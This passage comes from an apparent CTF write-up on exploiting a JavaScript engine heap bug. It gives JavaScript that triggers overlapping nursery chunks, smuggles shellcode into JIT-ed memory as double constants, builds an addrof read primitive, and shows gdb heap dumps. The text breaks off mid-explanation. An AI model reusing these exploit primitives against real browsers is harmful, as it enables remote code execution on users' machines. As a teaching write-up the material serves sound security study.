</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> sc() {
</span></span><span style="display:flex;"><span>    sc_marker <span style="color:#555">=</span> <span style="color:#f60">5.40900888</span>e<span style="color:#555">-</span><span style="color:#f60">315</span>;
</span></span><span style="display:flex;"><span>    SC1 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.827620262216015</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC2 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82852429045179</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC3 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82831220543336</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> (i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> <span style="color:#f60">0x1000</span>; i<span style="color:#555">++</span>) sc();
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our sc method will be jitted, and the double constant hex representation will be stored inside the jit-ed area also.</p>
<p>Now, we successfully smuggle a controllable 8-bytes hex in the <code>r-x</code> area, what if the constant is actually crafted, so that the hex representation is actually a shellcode, where each constants represent 8-bytes shellcode? That means if we can somehow overwrite the js engine return address to jump to our constants, we will gain RCE.</p>
<p>So, we will try to smuggle our shellcode to the jit-ed area, and then try to jump to it. The limitation is 8-bytes per constant.</p>
<h4 id="final-plan">Final Plan <a href="#final-plan" class="anchor">#</a></h4>
<p>Gathering from all the above information, our plan will be:</p>
<ul>
<li>Trigger overlapping chunk bug, so that we have two array, where the first array&rsquo;s elements is actually pointing to the other metadata.</li>
<li>Create read and write gadget</li>
<li>Smuggle shellcode to the JIT-ed area</li>
<li>With our write gadget, overwrite the return address of the engine to jump to our smuggled shellcode.</li>
</ul>
<p>Now, let&rsquo;s move to the detailed of my solution.</p>
<h3 id="solution">Solution <a href="#solution" class="anchor">#</a></h3>
<p>Below is the detailed step by step on how I craft my solution based on the final plan that I described before.</p>
<h4 id="trigger-overlapping-chunk">Trigger Overlapping chunk <a href="#trigger-overlapping-chunk" class="anchor">#</a></h4>
<p>Let&rsquo;s restart our previous shell, and load this code:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Sequence of operations to corrupt the Nursery Heap */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// NOTES:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// - The size that I choose is based on trial-and-error inspecting the GDB
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>a <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x7e</span>) <span style="color:#09f;font-style:italic">// This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>b <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x50</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (b-chunk) after the a-chunk position_ is still correct
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>a.length <span style="color:#555">=</span> <span style="color:#f60">0</span> <span style="color:#09f;font-style:italic">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>b.fill(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic">// Fill b to increase the array b total element count, so that later we can write a value to any of b array elements.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>c <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x50</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (c-chunk), which overlap a-chunk &amp; b-chunk. position_ will point to around b-chunk
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>c.length <span style="color:#555">=</span> <span style="color:#f60">0x10</span> <span style="color:#09f;font-style:italic">// This will trigger reallocateBuffer (which is the bug).  After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">0x20</span>) <span style="color:#09f;font-style:italic">// This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d.fill(<span style="color:#f60">0</span>) <span style="color:#09f;font-style:italic">// Fill d to increase the array d total element count.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Assign 3 properties to d. This will be used during crafting addrof method
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>d.x <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span><span style="display:flex;"><span>d.y <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span><span style="display:flex;"><span>d.z <span style="color:#555">=</span> <span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on trial and error and inspecting the gdb, the above payload will trigger the overlapping chunk bug, where with <code>b</code>, we can overwrite the <code>d</code> metadata that stored pointers to its properties and elements address. You can read the code comments for summary on why it create an overlapping chunks.</p>
<p>So, inspecting via gdb, below is the current heap layout</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/50gx 0x1f4107200ae0
</span></span><span style="display:flex;"><span>0x1f4107200ae0: 0x00007ffff6951ff0      0x00003afd8a760f40
</span></span><span style="display:flex;"><span>0x1f4107200af0: 0x000055555700b9a8      0x00001f4107200b20
</span></span><span style="display:flex;"><span>0x1f4107200b00: 0x0000000000000000      0x0000005000000000
</span></span><span style="display:flex;"><span>0x1f4107200b10: 0x0000005000000000      0x0000005000000050
</span></span><span style="display:flex;"><span>0x1f4107200b20: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200b30: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200b40: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200b50: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200b60: 0xfff8800000000000      0x0000000e00000000
</span></span><span style="display:flex;"><span>0x1f4107200b70: 0x0000000e0000000e      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200b80: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200b90: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200ba0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200bb0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200bc0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200bd0: 0xfffb3afd8a761560      0xfffb3afd8a761560
</span></span><span style="display:flex;"><span>0x1f4107200be0: 0xfffb3afd8a761560      0x00007ffff6951ff0
</span></span><span style="display:flex;"><span>0x1f4107200bf0: 0x00003afd8a765140      0x00001f4107200da0
</span></span><span style="display:flex;"><span>0x1f4107200c00: 0x00001f4107200c28      0x0000000000000000
</span></span><span style="display:flex;"><span>0x1f4107200c10: 0x0000002000000000      0x0000002000000000
</span></span><span style="display:flex;"><span>0x1f4107200c20: 0x0000002000000020      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200c30: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200c40: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200c50: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200c60: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>gef➤  x/10gx 0x00001f4107200da0
</span></span><span style="display:flex;"><span>0x1f4107200da0: 0x0000000000001337      0x0000000000001337
</span></span><span style="display:flex;"><span>0x1f4107200db0: 0x0000000000001337      0x00007ffff6951ff2
</span></span><span style="display:flex;"><span>0x1f4107200dc0: 0x0000000c00000250      0x3032373031346631
</span></span><span style="display:flex;"><span>0x1f4107200dd0: 0x0000000038656130      0x00007ffff6951ff2
</span></span><span style="display:flex;"><span>0x1f4107200de0: 0x0000000e00000250      0x3237303134663122
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li><code>0x1f4107200b20</code> is the starting of array B elements.</li>
<li><code>0x1f4107200bf8</code> is used by array D to store pointer to its properties (on <code>0x1f4107200da0</code>). Notice that b[27] is pointing to the same address.</li>
</ul>
<p>As you can see, the <code>d</code> stored pointer for properties (address <code>0x1f4107200bf8</code>) is actually overlapping with <code>b</code> 27th element. So, if we assign <code>b[27]</code> with a value, it will override the <code>d</code> properties stored pointer.</p>
<h4 id="create-read-and-write-gadget">Create Read and Write Gadget <a href="#create-read-and-write-gadget" class="anchor">#</a></h4>
<p>Before creating our read and write gadget, let&rsquo;s create some helper first to cast double and bigint easily. We will need this later.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Initializing helper method for casting purposes */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Converter taken from https://org.anize.rs/corCTF-2021/pwn/outfoxed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// This will help us to convert between BigInt and Double easily
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">let</span> converter <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> ArrayBuffer(<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">let</span> u64view <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> BigUint64Array(converter);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">let</span> f64view <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(converter);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Bit-cast an uint64_t to a float64
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> i2d(x) {
</span></span><span style="display:flex;"><span>    u64view[<span style="color:#f60">0</span>] <span style="color:#555">=</span> x;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> f64view[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Bit-cast a float64 to an uint64_t
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> d2i(x) {
</span></span><span style="display:flex;"><span>    f64view[<span style="color:#f60">0</span>] <span style="color:#555">=</span> x;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> u64view[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Add double with BigInt. Return Double
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> doubleAddBigInt(x, y) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> i2d(d2i(x) <span style="color:#555">+</span> y)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s start describing on how we will use the above overlapping object to create our read gadget. Below is the code that I use to create a method to read an object address. Below is the code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* Building function to perform read &amp; write */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Some ideas are taken from https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>d.x <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span>d.y <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span>d.z <span style="color:#555">=</span> <span style="color:#f60">0.0</span>;
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Return given object address
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> addrof(o) {
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// The purpose of this logic is given an object, we want to get the address of it. Logic:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - First, we will store the original pointer of the object d properties
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Then, we will set the given object to d.y
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Instead of reading the stored value inside d.y, what we want to read is only the 6-LSB (bytes, not bits)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">//   So, the trick is we will try to read d.x+6 (shift the current object d properties pointer by 6)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Now, the new d.x 8-bytes will consist of |d.y+5|d.y+4|d.y+3|d.y+2|d.y+1|d.y|d.x+8|d.x+7|
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - After that, convert it to BigInt, and then shift it by 2-bytes, so that we get the true address without tag.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Revert the pointer and return the Double representation of the object address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    original <span style="color:#555">=</span> b[<span style="color:#f60">27</span>]
</span></span><span style="display:flex;"><span>    d.y <span style="color:#555">=</span> o
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> doubleAddBigInt(b[<span style="color:#f60">27</span>], <span style="color:#f60">0x6</span>n)
</span></span><span style="display:flex;"><span>    result <span style="color:#555">=</span> i2d(d2i(d.x) <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">16</span>n)
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> original
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> result
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain it, remember that when we inspect the gdb, <code>b[27]</code> is actually the <code>d</code> stored pointer of properties. So, what this code aim to do:</p>
<ul>
